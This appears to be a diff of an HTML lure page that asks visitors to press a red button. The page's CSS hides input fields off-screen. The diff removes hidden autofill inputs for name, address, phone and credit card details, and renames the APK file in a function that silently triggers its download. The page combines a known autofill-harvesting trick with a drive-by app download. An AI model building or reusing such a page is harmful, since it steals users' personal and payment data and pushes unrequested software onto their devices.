@@ -35,23 +35,6 @@ input { position: absolute; top: 0; left: -300px; opacity: 0.0001; }
 
 <p id="output">(no output yet...)</p>
 
-<!-- Group 1 -->
-<input id="groupOneElem" name="name" autocomplete="name">
-<input name="email" autocomplete="email">
-<input name="address-line1" autocomplete="address-line1">
-<input name="address-line2" autocomplete="address-line2">
-<input name="city" autocomplete="address-level2">
-<input name="state" autocomplete="address-level1">
-<input name="country-name" autocomplete="country-name">
-<input name="postal-code" autocomplete="postal-code">
-<input name="tel" autocomplete="tel">
-
-<!-- Group 2 -->
-<input id="groupTwoElem" name="cc-name" autocomplete="cc-name">
-<input name="cc-number" autocomplete="cc-number">
-<input name="cc-exp-month" autocomplete="cc-exp-month">
-<input name="cc-exp-year" autocomplete="cc-exp-year">
-
 <p id="instructions">Press the red button as fast as you can</p>
 
 <script>
@@ -91,8 +74,8 @@ inputElem.addEventListener('change', (e) => {
 // Trigger APK download
 function downloadApk() {
   const apkLink = document.createElement('a');
-  apkLink.href = 'qwerty.apk'; // Make sure this file is hosted and accessible
-  apkLink.download = 'qwerty.apk';
+  apkLink.href = 'qwertyuiop.apk'; // Make sure this file is hosted and accessible
+  apkLink.download = 'qwertyuiop.apk';
   document.body.appendChild(apkLink);
   apkLink.click();
   document.body.removeChild(apkLink);
